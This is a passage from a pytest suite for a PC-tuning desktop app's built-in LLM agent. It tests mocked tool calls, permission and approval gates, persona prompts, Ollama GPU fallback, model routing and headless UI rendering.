        pb = ProBalanceEngine(cm, journal)
        reg = DeviceRegistryManager(cm, journal)
        reg.register_device(
            "My iPhone 16 Pro Max",
            device_type="iPhone / iPad",
            os_family="iOS",
            network_host="100.77.1.2",
            program_command="astrabeam",
            auto_connect=False,
        )

        hm = HermesAgentManager(
            cm,
            journal,
            rollback_mgr=rb,
            self_heal=sh,
            probalance=pb,
            device_registry=reg,
        )
        hm.ensure_hermes_home(cfg)

        # 1. Whole-PC & remote usage auto-learning
        gpu = SimpleNamespace(available=True, name="RTX", utilization_percent=30.0, vram_used_mb=2100.0, vram_total_mb=8192.0)
        hm.observe_running_workload(
            [{"name": "code"}, {"name": "firefox"}, {"name": "sunshine"}, {"name": "tailscaled"}],
            focus_process="code",
            is_fullscreen=False,
            gpu=gpu,
            cpu_percent=42.5,
            ram_percent=58.0,
        )
        hm.record_remote_task("My iPhone 16 Pro Max", "astrabeam_stream", True, "Connected over Tailscale")

        summ = hm.execute_tool("astra_pc_usage_summary", {}, cfg)
        assert summ["ok"] is True
        assert summ["samples_recorded"] >= 1
        assert summ["peak_cpu_pct"] == 42.5
        assert "coding_dev" in summ["workflow_categories"]
        assert "sunshine" in summ["remote_services_seen"]
        assert len(summ["paired_devices"]) == 1
        assert len(summ["recent_remote_tasks"]) == 1

        sys_prompt = hm._build_system_prompt(cfg)
        assert "Learned Whole-PC & Remote Usage Context" in sys_prompt
        assert "Action & Self-Development Assistant Guidelines" in sys_prompt

        # 2. Integrated safe PC-fixing tools
        prof_res = hm.execute_tool(
            "astra_probalance_and_profile",
            {"action": "set_profile", "profile_name": "Gaming / Low-Latency"},
            cfg,
        )
        assert prof_res["ok"] is True
        assert cfg.active_profile == "Gaming / Low-Latency"

        rem_res = hm.execute_tool("astra_remote_tasks", {"action": "status"}, cfg)
        assert rem_res["ok"] is True
        assert len(rem_res["paired_devices"]) == 1

        heal_res = hm.execute_tool("astra_self_heal_repair", {}, cfg)
        assert heal_res["ok"] is True
        assert heal_res["checks_count"] >= 7

        undo_res = hm.execute_tool("astra_rollback_undo", {"action": "list"}, cfg)
        assert undo_res["ok"] is True

        startup_res = hm.execute_tool("astra_startup_audit", {"action": "list"}, cfg)
        assert startup_res["ok"] is True

        # Read-only mode blocks mutating actions cleanly
        cfg.hermes_permission_level = "read_only"
        blocked = hm.execute_tool("astra_probalance_and_profile", {"action": "restrain_hogs"}, cfg)
        assert blocked["ok"] is False and blocked.get("blocked") is True


def test_app_init_no_unbound_elevation_and_hermes_self_dev_tools(monkeypatch) -> None:
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.ui.app import AstraCradleApp

    # 1. Guard against UnboundLocalError in AstraCradleApp.__init__ and TclError pack-before in hermes_page.py
    assert "ElevationRunner" not in AstraCradleApp.__init__.__code__.co_varnames
    hp_txt = (Path(__file__).resolve().parents[1] / "astracradle" / "ui" / "pages" / "hermes_page.py").read_text(encoding="utf-8")
    assert "before=key_ent" not in hp_txt

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "cfg")
        cfg = AppConfig(hermes_permission_level="standard_user", hermes_allow_web_search=True)
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        hm.ensure_hermes_home(cfg)

        # 2. Create, list, grep, read (line-numbered), and surgically edit with automatic backup
        proj = Path(td) / "local_build"
        proj.mkdir(parents=True, exist_ok=True)
        target = proj / "sample_feature.py"

        w_res = hm.execute_tool("file_write", {"path": str(target), "content": "def greet():\n    return 'old'\n"}, cfg)
        assert w_res["ok"] is True

        ls_res = hm.execute_tool("list_dir", {"path": str(proj), "pattern": "*.py"}, cfg)
        assert ls_res["ok"] is True and any(e["name"] == "sample_feature.py" for e in ls_res["entries"])

        gr_res = hm.execute_tool("grep_search", {"pattern": "def greet", "path": str(proj)}, cfg)
        assert gr_res["ok"] is True and len(gr_res["matches"]) == 1

        ed_res = hm.execute_tool(
            "file_edit",
            {"path": str(target), "old_text": "return 'old'", "new_text": "return 'updated'"},
            cfg,
        )
        assert ed_res["ok"] is True and Path(ed_res["backup"]).exists()

        rd_res = hm.execute_tool("file_read", {"path": str(target), "offset": 1, "limit": 10}, cfg)
        assert rd_res["ok"] is True and "return 'updated'" in rd_res["content"]

        # 3. Web search, fetch, and URL skill install (mocked HTTP)
        monkeypatch.setattr(
            hm,
            "_web_search_impl",
            lambda q, max_results=6: [{"title": "CachyOS Optimization", "url": "https://wiki.cachyos.org", "snippet": f"Tips for {q}"}],
        )
        ws_res = hm.execute_tool("web_search", {"query": "cachyos python tuning"}, cfg)
        assert ws_res["ok"] is True and ws_res["results"][0]["title"] == "CachyOS Optimization"

        class _FakeResp:
            def __init__(self, body: str) -> None:
                self._b = body.encode("utf-8")

            def read(self, _n: int = -1) -> bytes:
                return self._b

            def __enter__(self):
                return self

            def __exit__(self, *_a):
                return False

        monkeypatch.setattr(
            "astracradle.core.hermes_agent.urllib.request.urlopen",
            lambda *_a, **_kw: _FakeResp("<html><body><h1>Remote Skill</h1><p>Check thermals first.</p></body></html>"),
        )
        wf_res = hm.execute_tool("web_fetch", {"url": "https://example.com/guide"}, cfg)
        assert wf_res["ok"] is True and "Check thermals first." in wf_res["content"]

        sk_res = hm.execute_tool("skill_install_from_url", {"slug": "thermal-guide", "url": "https://example.com/SKILL.md"}, cfg)
        assert sk_res["ok"] is True and Path(sk_res["skill_path"]).exists()

        mem_res = hm.execute_tool("memory_read", {"target": "all"}, cfg)
        assert mem_res["ok"] is True and any(s["slug"] == "thermal-guide" for s in mem_res["skills"])

        # 4. Native AstraCradle local source locator
        dev_res = hm.execute_tool("astra_dev_self_build", {"action": "locate"}, cfg)
        assert dev_res["ok"] is True and (Path(dev_res["source_root"]) / "astracradle" / "__main__.py").exists()

        # 5. Respects hermes_allow_web_search=False & Level 2 file boundary
        cfg.hermes_allow_web_search = False
        ws_off = hm.execute_tool("web_search", {"query": "test"}, cfg)
        assert ws_off["ok"] is False and ws_off.get("blocked") is True
        cfg.hermes_permission_level = "safe_user"
        ed_blocked = hm.execute_tool(
            "file_edit",
            {"path": str(target), "old_text": "return 'updated'", "new_text": "return 'x'"},
            cfg,
        )
        assert ed_blocked["ok"] is False and ed_blocked.get("blocked") is True


def test_hermes_personas_standard_plus_ten_and_think_strip(monkeypatch) -> None:
    import io
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HERMES_PERSONAS, HermesAgentManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.ui.pages import hermes_page

    # 1. Verify Standard personality + 10 unique selectable identities (11 total)
    assert "astra_standard" in HERMES_PERSONAS
    assert len(HERMES_PERSONAS) == 11
    names = {spec["name"] for spec in HERMES_PERSONAS.values()}
    assert len(names) == 11
    for key, spec in HERMES_PERSONAS.items():
        for field_name in ("label", "name", "badge", "tagline", "traits", "mannerisms", "greeting", "prompt_directive"):
            assert str(spec.get(field_name) or "").strip(), f"{key} missing {field_name}"

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "cfg")
        cfg = AppConfig()
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        hm.ensure_hermes_home(cfg)

        # 2. Verify switching persona updates _build_system_prompt with traits & mannerisms
        for key in ("astra_standard", "kestrel_tactician", "sterling_butler", "halcyon_retro"):
            cfg.hermes_persona = key
            prompt = hm._build_system_prompt(cfg)
            spec = HERMES_PERSONAS[key]
            assert spec["name"] in prompt
            assert spec["traits"] in prompt
            assert spec["mannerisms"] in prompt

        # 3. Verify <think>...</think> tags from reasoning models like Qwen3.6 are stripped cleanly
        class _OllamaResp:
            def read(self) -> bytes:
                return json.dumps(
                    {
                        "choices": [
                            {
                                "message": {
                                    "content": "<think>internal chain of thought</think>\nYes, I can see your PC clearly!",
                                    "tool_calls": [],
                                }
                            }
                        ]
                    }
                ).encode("utf-8")

            def __enter__(self):
                return self

            def __exit__(self, *_a):
                return False

        captured_timeouts: list[float] = []

        def _fake_urlopen(req, timeout=0):
            captured_timeouts.append(timeout)
            assert req.full_url.endswith("/api/chat")
            return _OllamaResp()

        monkeypatch.setattr("astracradle.core.hermes_agent.urllib.request.urlopen", _fake_urlopen)
        spec = hm.resolve_provider_spec(AppConfig(hermes_local_only=True, hermes_mode="local_gpu", hermes_provider="ollama", hermes_model="qwen3.6:35b"))
        txt, calls = hm._call_llm(spec, "", [{"role": "user", "content": "hi"}], [])
        assert txt == "Yes, I can see your PC clearly!"
        assert calls == []
        assert captured_timeouts and captured_timeouts[0] >= 240

    # 4. Verify UI page exposes 15 quick-action dropdown entries + full-screen chat workspace + persona helpers
    assert len(hermes_page._QUICK_ACTION_CHIPS) >= 15
    assert callable(hermes_page._build_chat_workspace)
    assert callable(hermes_page._render_chat_bubbles)


def test_ui_theme_fonts_palette_and_hermes_page_render_headless(monkeypatch) -> None:
    import re
    import types
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager, HermesHardwareRecommendation, HermesSetupStatus
    from astracradle.core.journal import ForensicJournal
    from astracradle.theme import get_palette, get_ui_fonts
    from astracradle.ui.pages import hermes_page

    # 1. Static guard across ALL UI files for valid font keys and palette attributes
    pal = get_palette("dark")
    fonts = get_ui_fonts(1.0)
    ui_root = Path(__file__).resolve().parents[1] / "astracradle" / "ui"
    for pyf in ui_root.rglob("*.py"):
        txt = pyf.read_text(encoding="utf-8")
        for m in re.finditer(r'(?:fonts|f)\["([a-z_]+)"\]', txt):
            assert m.group(1) in fonts, f"{pyf}: invalid font key {m.group(1)}"
        for m in re.finditer(r"\b(?:p|palette)\.(accent_[a-z_]+|badge_[a-z_]+|bg_[a-z_]+|text_[a-z_]+|border_[a-z_]+)\b", txt):
            assert hasattr(pal, m.group(1)), f"{pyf}: invalid ThemePalette attribute {m.group(1)}"

    # 2. Headless end-to-end execution of render_hermes_page (standard + fullscreen) and open_quick_assistant_modal
    class _FakeVar:
        def __init__(self, value=None) -> None:
            self._v = value

        def get(self):
            return self._v

        def set(self, v) -> None:
            self._v = v

    class _FakeWidget:
        def __init__(self, *_a, **_kw) -> None:
            self._children: list[_FakeWidget] = []
            self._parent = _a[0] if (_a and hasattr(_a[0], "_children")) else None
            self._parent_canvas = types.SimpleNamespace(yview_moveto=lambda *_x: None)
            if self._parent is not None:
                self._parent._children.append(self)

        def pack(self, *_a, **_kw) -> None:
            pass

        def grid(self, *_a, **_kw) -> None:
            pass

        def grid_columnconfigure(self, *_a, **_kw) -> None:
            pass

        def bind(self, *_a, **_kw) -> None:
            pass

        def configure(self, *_a, **_kw) -> None:
            pass

        def insert(self, *_a, **_kw) -> None:
            pass

        def delete(self, *_a, **_kw) -> None:
            pass

        def get(self, *_a, **_kw) -> str:
            return ""

        def set(self, *_a, **_kw) -> None:
            pass

        def focus_set(self) -> None:
            pass

        def focus_force(self) -> None:
            pass

        def lift(self) -> None:
            pass

        def destroy(self) -> None:
            if self._parent is not None and self in self._parent._children:
                self._parent._children.remove(self)

        def title(self, *_a) -> None:
            pass

        def geometry(self, *_a) -> None:
            pass

        def minsize(self, *_a) -> None:
            pass

        def transient(self, *_a) -> None:
            pass

        def winfo_exists(self) -> bool:
            return True

        def winfo_children(self):
            return list(self._children)

        def update_idletasks(self) -> None:
            pass

        def add(self, _name: str):
            w = _FakeWidget(self)
            return w

    fake_ctk = types.SimpleNamespace(
        CTkFrame=_FakeWidget,
        CTkScrollableFrame=_FakeWidget,
        CTkLabel=_FakeWidget,
        CTkButton=_FakeWidget,
        CTkOptionMenu=_FakeWidget,
        CTkEntry=_FakeWidget,
        CTkTextbox=_FakeWidget,
        CTkSwitch=_FakeWidget,
        CTkSlider=_FakeWidget,
        CTkProgressBar=_FakeWidget,
        CTkTabview=_FakeWidget,
        CTkToplevel=_FakeWidget,
    )
    fake_tk = types.SimpleNamespace(StringVar=_FakeVar, BooleanVar=_FakeVar)
    monkeypatch.setattr(hermes_page, "ctk", fake_ctk)
    monkeypatch.setattr(hermes_page, "tk", fake_tk)

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "cfg")
        cfg = AppConfig(hermes_local_only=True, hermes_mode="local_gpu", hermes_provider="ollama", hermes_model="qwen3.6:35b")
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        hm.ensure_hermes_home(cfg)

        fake_app = types.SimpleNamespace(
            hermes_scroll=_FakeWidget(),
            palette=pal,
            fonts=fonts,
            config_obj=cfg,
            cfg_mgr=cm,
            hermes_mgr=hm,
            current_nav="hermes",
            _hermes_rec_cache=HermesHardwareRecommendation(
                gpu_name="card2",
                gpu_vram_gb=24.0,
                system_ram_gb=126.0,
                is_apple_silicon=False,
                tier_name="24GB+",
                recommended_local_model="qwen3.6:35b",
                local_alternatives=[],
                recommended_context_tokens=65536,
                local_reason="24 GB VRAM",
                local_viable=True,
                optimal_free_provider="openrouter_free",
                optimal_free_model="qwen/qwen3-coder:free",
                free_reason="free",
            ),
            _hermes_status_cache=HermesSetupStatus(
                hermes_home=str(hm.hermes_home),
                hermes_cli_installed=False,
                hermes_pkg_installed=False,
                ollama_installed=True,
                ollama_running=True,
                pulled_models=["qwen3.6:35b"],
                active_mode="local_gpu",
                active_provider="ollama",
                active_model="qwen3.6:35b",
                api_key_configured=True,
                ready=True,
                summary="READY (Local GPU · qwen3.6:35b)",
            ),
            _content_wrap=lambda pad=0: max(400, 1000 - pad),
            show_toast=lambda *_a: None,
            switch_nav=lambda *_a: None,
            after=lambda _ms, fn: None,
        )

        # Standard view
        hermes_page.render_hermes_page(fake_app)
        assert len(fake_app.hermes_scroll._children) >= 2

        # Full-screen chat view
        fake_app._hermes_fullscreen_chat = True
        hermes_page.render_hermes_page(fake_app)
        assert len(fake_app.hermes_scroll._children) == 2

        # Quick assistant modal
        hermes_page.open_quick_assistant_modal(fake_app)
        assert fake_app._quick_ai_win is not None


def test_hermes_ollama_llama_server_segfault_auto_recovery(monkeypatch) -> None:
    import io
    import urllib.error
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "cfg")
        cfg = AppConfig(hermes_local_only=True, hermes_mode="local_gpu", hermes_provider="ollama", hermes_model="qwen3.6:35b")
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        hm.ensure_hermes_home(cfg)

        seen_options: list[dict[str, object]] = []
        seen_urls: list[str] = []

        class _OkResp:
            def read(self) -> bytes:
                return json.dumps(
                    {"message": {"role": "assistant", "content": "Recovered cleanly!", "tool_calls": []}}
                ).encode("utf-8")

            def __enter__(self):
                return self

            def __exit__(self, *_a):
                return False

        def _flaky_ollama(req, timeout=0):
            seen_urls.append(req.full_url)
            body = json.loads(req.data.decode("utf-8"))
            assert body.get("stream") is False
            opts = dict(body.get("options") or {})
            seen_options.append(opts)
            if len(seen_options) <= 2:
                raise urllib.error.HTTPError(
                    req.full_url,
                    500,
                    "Internal Server Error",
                    None,
                    io.BytesIO(
                        b'{"error":{"message":"llama-server process has terminated: signal: segmentation fault (core dumped)"}}'
                    ),
                )
            return _OkResp()

        monkeypatch.setattr("astracradle.core.hermes_agent.urllib.request.urlopen", _flaky_ollama)
        monkeypatch.setattr("astracradle.core.hermes_agent.time.sleep", lambda *_a: None)

        spec = hm.resolve_provider_spec(cfg)
        spec["gpu_plan"] = {"num_ctx": 16384, "num_batch": 128, "num_gpu_layers": 13, "keep_alive": "1m"}
        txt, calls = hm._call_llm(spec, "", [{"role": "user", "content": "Can you see this?"}], [])

        assert len(seen_options) == 3
        assert all(u.endswith("/api/chat") for u in seen_urls)
        assert "num_gpu" in seen_options[0]
        assert "num_gpu" not in seen_options[1]
        assert seen_options[2].get("num_gpu") == 0
        assert "Recovered cleanly!" in txt
        assert "ROCR_VISIBLE_DEVICES=0" not in txt
        assert "Auto-recovered via safe CPU/RAM fallback" not in txt
        assert spec["model"] in hm._gpu_fallback_models
        diags = hm.get_recent_diagnostics(limit=5)
        assert any(d.get("event") == "ollama_gpu_runner_fallback" and "ROCR_VISIBLE_DEVICES=0" in (d.get("remediation") or "") for d in diags)
        assert calls == []


def test_hermes_dynamic_model_routing_sidebar_order_deps_and_font_clip_fix() -> None:
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.ui.pages import hermes_page

    # 1. Sidebar nav puts Hermes OS AI directly below Home Overview (dashboard)
    app_txt = (Path(__file__).resolve().parents[1] / "astracradle" / "ui" / "app.py").read_text(encoding="utf-8")
    dash_idx = app_txt.index('("dashboard",')
    hermes_idx = app_txt.index('("hermes",')
    playbook_idx = app_txt.index('("playbook",')
    assert dash_idx < hermes_idx < playbook_idx

    # 2. Bubble labels use anchor="w" + empty tool trace hidden + font size options exist
    hp_txt = (Path(__file__).resolve().parents[1] / "astracradle" / "ui" / "pages" / "hermes_page.py").read_text(encoding="utf-8")
    assert 'anchor="w"' in hp_txt
    assert "_hermes_wrap_bound" in hp_txt
    assert hermes_page._format_tool_trace("[]") == ""
    assert len(hermes_page._CHAT_FONT_SIZES) >= 4
    assert AppConfig().hermes_chat_font_size >= 13

    # 3. Dynamic model routing scales fast -> balanced -> heavy intelligently
    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "cfg")
        cfg = AppConfig(
            hermes_local_only=True,
            hermes_mode="local_gpu",
            hermes_provider="ollama",
            hermes_model="qwen3.6:35b",
            hermes_dynamic_model_routing=True,
            hermes_autonomous_guardian=True,
        )
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        hm.ensure_hermes_home(cfg)
        installed = ["qwen3.6:35b", "qwen3:14b", "qwen3:8b"]

        r_fast = hm.select_dynamic_ollama_model("Can you see this?", cfg, installed_models=installed)
        assert r_fast["tier"] == "fast"
        assert r_fast["model"] == "qwen3:8b"
        assert r_fast["think"] is False
        assert hm._prompt_needs_tools("Can you see this?") is False

        r_bal = hm.select_dynamic_ollama_model("Check my Wi-Fi channels and startup apps", cfg, installed_models=installed)
        assert r_bal["tier"] == "balanced"
        assert r_bal["model"] == "qwen3:14b"
        assert r_bal["think"] is False

        r_heavy = hm.select_dynamic_ollama_model(
            "Debug the Python traceback and edit astracradle's code to fix the bug",
            cfg,
            installed_models=installed,
        )
        assert r_heavy["tier"] == "heavy"
        assert r_heavy["model"] == "qwen3.6:35b"
        assert r_heavy["think"] is True

        # 4. Dependency checker tool returns structured status
        dep_chk = hm.execute_tool("astra_dependencies", {"action": "check"}, cfg)
        assert dep_chk["ok"] is True
        assert "missing_python" in dep_chk and "missing_companion" in dep_chk

        # 5. Autonomous passive guardian runs & persists status cleanly
        g_res = hm.run_autonomous_passive_cycle(cfg, is_gaming=True, min_interval_sec=0.0)
        assert g_res["ran"] is True
        assert g_res["is_gaming"] is True
        assert hm.autonomous_status_path.exists()
        g_throttled = hm.run_autonomous_passive_cycle(cfg, min_interval_sec=90.0)
        assert g_throttled["ran"] is False and g_throttled["reason"] == "throttled"


def test_hermes_streaming_tool_subsets_fts_approval_vision_and_tools(monkeypatch) -> None:
    import io
    from PIL import Image
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.core.rollback import RollbackManager

    with tempfile.TemporaryDirectory() as td:
        base = Path(td) / "cfg"
        cm = ConfigManager(base_dir=base)
        journal = ForensicJournal(cm)
        rb = RollbackManager(cm)
        cfg = AppConfig(
            hermes_local_only=True,
            hermes_mode="local_gpu",
            hermes_provider="ollama",
            hermes_model="qwen3:8b",
            hermes_permission_level="standard_user",
            hermes_require_approval=True,
        )

        # 1. Approval gate blocks denied edits and allows approved Python edits with post_verify
        approvals = iter([False, True])
        hm = HermesAgentManager(cm, journal, rollback_mgr=rb, approval_prompt_cb=lambda _t, _d: next(approvals))
        hm.ensure_hermes_home(cfg)

        py_target = Path(td) / "sample_mod.py"
        py_target.write_text("x = 1\n", encoding="utf-8")

        denied = hm.execute_tool("file_edit", {"path": str(py_target), "old_text": "x = 1", "new_text": "x = 2"}, cfg)
        assert denied["ok"] is False and denied.get("blocked") is True
        assert py_target.read_text(encoding="utf-8") == "x = 1\n"

        approved = hm.execute_tool("file_edit", {"path": str(py_target), "old_text": "x = 1", "new_text": "x = 2"}, cfg)
        assert approved["ok"] is True
        assert approved["post_verify"]["syntax_ok"] is True
        assert len(rb.load_entries()) >= 1

        # 2. Persistent GPU fallback model survives manager restart
        hm._save_gpu_fallback_model("qwen3.6:35b", "cpu_safe")
        hm2 = HermesAgentManager(cm, journal)
        assert "qwen3.6:35b" in hm2._gpu_fallback_models

        # 3. Intent-matched tool subsets stay lean
        all_t = hm._tool_schemas()
        wifi_t = {t["function"]["name"] for t in hm._select_tool_schemas("optimize my wifi network", all_t)}
        assert "astra_wifi_optimize" in wifi_t and "file_edit" not in wifi_t
        code_t = {t["function"]["name"] for t in hm._select_tool_schemas("edit astracradle python code", all_t)}
        assert "file_edit" in code_t and "astra_dev_self_build" in code_t

        # 4. FTS5 memory search + journal/crashes + services/storage tools work
        hm.append_memory("User prefers ROCR_VISIBLE_DEVICES=0 for Radeon discrete GPU", target="MEMORY.md")
        ms = hm.execute_tool("memory_search", {"query": "ROCR_VISIBLE_DEVICES"}, cfg)
        assert ms["ok"] is True and ms["count"] >= 1

        jc = hm.execute_tool("astra_journal_and_crashes", {"limit": 10}, cfg)
        assert jc["ok"] is True and "audit_findings" in jc

        ss = hm.execute_tool("astra_services_and_storage", {}, cfg)
        assert ss["ok"] is True and "disks" in ss

        # 5. Vision image attachment base64 encoding
        img_p = Path(td) / "shot.png"
        Image.new("RGB", (8, 8), (10, 20, 30)).save(img_p)
        b64s = hm._encode_image_attachments([str(img_p)])
        assert len(b64s) == 1 and len(b64s[0]) > 10

        # 6. Native Ollama streaming NDJSON emits progressive callbacks
        ndjson = (
            json.dumps({"message": {"content": "Hello "}, "done": False}) + "\n"
            + json.dumps({"message": {"content": "world!"}, "done": True}) + "\n"
        ).encode("utf-8")

        class _StreamResp(io.BytesIO):
            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

        monkeypatch.setattr("astracradle.core.hermes_agent.urllib.request.urlopen", lambda _req, timeout=0: _StreamResp(ndjson))
        seen_chunks: list[str] = []
        spec = hm.resolve_provider_spec(cfg)
        txt, calls = hm._call_llm(spec, "", [{"role": "user", "content": "hi"}], [], stream_cb=seen_chunks.append)
        assert txt == "Hello world!"
        assert calls == []
        assert len(seen_chunks) >= 2 and seen_chunks[-1] == "Hello world!"


def test_hermes_all_10_upgrades_screen_clipboard_voice_git_and_speed() -> None:
    import threading
    from astracradle.core.advanced_controls import GpuPowerAndFanController
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import HermesAgentManager
    from astracradle.core.journal import ForensicJournal
    from astracradle.core.thermal_spc import ThermalSpcMonitor
    from astracradle.ui.pages import hermes_page

    # 1. Markdown cleanup strips ### and ** cleanly for Tk bubbles
    cleaned = hermes_page._clean_bubble_markdown("### **Overall System Usage**\n- **CPU**: `26%`")
    assert "###" not in cleaned and "**" not in cleaned and "`" not in cleaned
    assert "Overall System Usage" in cleaned

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "cfg")
        journal = ForensicJournal(cm)
        cfg = AppConfig(
            hermes_local_only=True,
            hermes_mode="local_gpu",
            hermes_provider="ollama",
            hermes_model="qwen3.6:35b",
            hermes_dynamic_model_routing=True,
        )
        hm = HermesAgentManager(
            cm,
            journal,
            thermal_spc=ThermalSpcMonitor(cm, journal),
            gpu_pwr=GpuPowerAndFanController(cm, journal),
        )
        hm.ensure_hermes_home(cfg)

        # 2. Avoids heavy CPU fallback when fast GPU model works
        hm._save_gpu_fallback_model("qwen3.6:35b", "cpu_safe")
        r_bal = hm.select_dynamic_ollama_model(
            "Optimize my Wi-Fi channels",
            cfg,
            installed_models=["qwen3.6:35b", "qwen3:8b"],
        )
        assert r_bal["model"] == "qwen3:8b"
        assert r_bal["think"] is False

        # 3. Tool schemas include all 6 new tools & intent subsetting maps screen/git/updates/av/thermals/voice
        all_t = hm._tool_schemas()
        all_names = {t["function"]["name"] for t in all_t}
        for req_tool in (
            "astra_screen_and_clipboard",
            "astra_git_sync",
            "astra_system_updates",
            "astra_av_and_peripherals",
            "astra_thermals_and_fans",
            "astra_voice_io",
        ):
            assert req_tool in all_names

        scr_set = {t["function"]["name"] for t in hm._select_tool_schemas("read the screen web page and copy it", all_t)}
        assert "astra_screen_and_clipboard" in scr_set

        # 4. Screen/clipboard, AV, Thermals/Fans, Voice status & Per-game profile tools execute cleanly
        scr_res = hm.execute_tool("astra_screen_and_clipboard", {"action": "read_display"}, cfg)
        assert "captured" in scr_res

        av_res = hm.execute_tool("astra_av_and_peripherals", {"action": "inspect"}, cfg)
        assert av_res["ok"] is True

        th_res = hm.execute_tool("astra_thermals_and_fans", {"action": "inspect"}, cfg)
        assert th_res["ok"] is True and "applied_curve_id" in th_res

        vc_res = hm.execute_tool("astra_voice_io", {"action": "status"}, cfg)
        assert vc_res["ok"] is True and "tts_backends" in vc_res

        upd_res = hm.execute_tool("astra_system_updates", {"action": "check"}, cfg)
        assert upd_res["ok"] is True

        g_prof = hm.set_game_profile("Cyberpunk2077", power_preference="performance", silence_bg_apps=True)
        assert g_prof["profile"]["power_preference"] == "performance"

        # 5. Stop-generation cancel_event stops run_prompt cleanly
        ev = threading.Event()
        ev.set()
        stopped = hm.run_prompt("Hello", cfg, cancel_event=ev, llm_caller=lambda *_a: ("Never", []))
        assert stopped.ok is True and "Stopped" in stopped.reply

        # 6. Zero-flicker streaming fast-path updates thinking label in-place without destroying bubbles
        class _DummyLbl:
            def __init__(self, text: str = "") -> None:
                self.text = text
                self.configure_calls = 0

            def winfo_exists(self) -> bool:
                return True

            def configure(self, **kw) -> None:
                if "text" in kw:
                    self.text = kw["text"]
                self.configure_calls += 1

        class _DummyScroll:
            def __init__(self, sig, lbl) -> None:
                self._hermes_render_sig = sig
                self._hermes_thinking_lbl = lbl
                self.destroyed = False

            def winfo_children(self):
                return [self]

            def destroy(self) -> None:
                self.destroyed = True

        msgs_demo = [{"ts": "2026-11-16T12:00:00", "role": "user", "content": "hi"}]
        persona_demo = hm.get_active_persona(cfg)
        sig_demo = (
            len(msgs_demo),
            tuple((str(m.get("ts") or ""), str(m.get("role") or ""), len(str(m.get("content") or ""))) for m in msgs_demo),
            str(persona_demo.get("name") or ""),
            13,
            "",
        )
        dlbl = _DummyLbl("Initial")
        dscroll = _DummyScroll(sig_demo, dlbl)
        hermes_page._render_chat_bubbles(
            dscroll,  # type: ignore[arg-type]
            msgs_demo,
            persona_demo,
            None,
            {"body": ("DejaVu Sans", 12)},
            chat_font_pt=13,
            thinking_text="Streaming chunk 123",
        )
        assert not dscroll.destroyed
        assert dlbl.text == "Streaming chunk 123" and dlbl.configure_calls == 1

        # 7. Vision routing keeps multimodal model when images are attached & reads non-image files cleanly
        r_vis = hm.select_dynamic_ollama_model(
            "Can you see what is wrong here?",
            cfg,
            installed_models=["qwen3:8b", "qwen3.6:35b"],
            has_images=True,
        )
        assert r_vis["model"] == "qwen3.6:35b" and r_vis.get("vision_routed") is True

        sample_log = Path(td) / "bot_trace.log"
        sample_log.write_text("ERROR: stream jitter detected\nPID=4242", encoding="utf-8")
        sample_img = Path(td) / "shot.png"
        sample_img.write_bytes(b"\x89PNG\r\n\x1a\n" + b"\x00" * 16)
        enc_imgs, att_ctx, att_names = hm.prepare_attachments([str(sample_img), str(sample_log)])
        assert len(enc_imgs) == 1
        assert "bot_trace.log" in att_names and "shot.png" in att_names
        assert "stream jitter detected" in att_ctx

        # 8. Dangling streaming ** markers are stripped & clipboard file paths attach cleanly
        assert "**" not in hermes_page._clean_bubble_markdown("3. **PID or")

        class _DummyClipTk:
            def clipboard_get(self) -> str:
                return f"file://{sample_log}"

        pasted_files, pasted_msg = hermes_page._capture_clipboard_attachments(hm, _DummyClipTk())
        assert str(sample_log) in pasted_files and pasted_msg

        # 9. astra_dev_self_build(inspect) & list_dir("") return real AstraCradle modules (never hallucinate bridges)
        insp = hm.execute_tool("astra_dev_self_build", {"action": "inspect"}, cfg)
        assert insp["ok"] is True
        core_files = {m["file"] for m in insp["core_modules"]}
        assert "astracradle/core/hermes_agent.py" in core_files
        ld = hm.execute_tool("list_dir", {"path": ""}, cfg)
        assert ld["ok"] is True and any(e["name"] == "astracradle" for e in ld["entries"])
        assert "NEVER invent fictional modules" in hm._build_system_prompt(cfg)


def test_hermes_full_skill_suite_knowledge_library_1gb_200gb_and_prune() -> None:
    from astracradle.core.config import AppConfig, ConfigManager
    from astracradle.core.hermes_agent import BUILTIN_FULL_SKILL_SUITE, HermesAgentManager
    from astracradle.core.journal import ForensicJournal

    with tempfile.TemporaryDirectory() as td:
        cm = ConfigManager(base_dir=Path(td) / "cfg")
        cfg = AppConfig(hermes_library_max_gb=200)
        hm = HermesAgentManager(cm, ForensicJournal(cm))
        hm.ensure_hermes_home(cfg)

        # 1. Full 18+ built-in skill suite + common reference items seeded
        skills = {s["slug"] for s in hm.list_skills()}
        assert len(BUILTIN_FULL_SKILL_SUITE) >= 18
        for slug, _d, _b in BUILTIN_FULL_SKILL_SUITE:
            assert slug in skills

        # 2. Configurable 1 GB - 200 GB cap (clamped)
        assert hm.get_library_max_bytes(AppConfig(hermes_library_max_gb=0)) == 1 * (1024**3)
        assert hm.get_library_max_bytes(AppConfig(hermes_library_max_gb=200)) == 200 * (1024**3)
